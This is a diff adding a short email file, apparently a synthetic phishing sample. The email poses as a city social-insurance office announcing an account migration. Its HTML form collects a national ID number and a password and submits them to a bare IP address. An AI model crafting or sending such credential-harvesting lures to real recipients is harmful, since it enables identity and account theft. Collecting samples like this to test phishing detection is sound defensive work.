@@ -1,0 +1,9 @@
+From: =?utf-8?B?56S+5L+d5p+l6K+i?= <shebao@city-hr.example>
+To: he.peng@corp.internal
+Date: Mon, 24 Aug 2026 09:28:00 +0800
+Message-ID: <0017-b1@synth.example>
+Subject: 个人社保账户查询入口变更
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>因系统迁移，个人社保查询需重新绑定账号：</p><form action='http://203.0.113.99/bind'><input name='idno' placeholder='身份证号'><input type='password' name='pwd' placeholder='查询密码'><button>绑定</button></form></body></html>
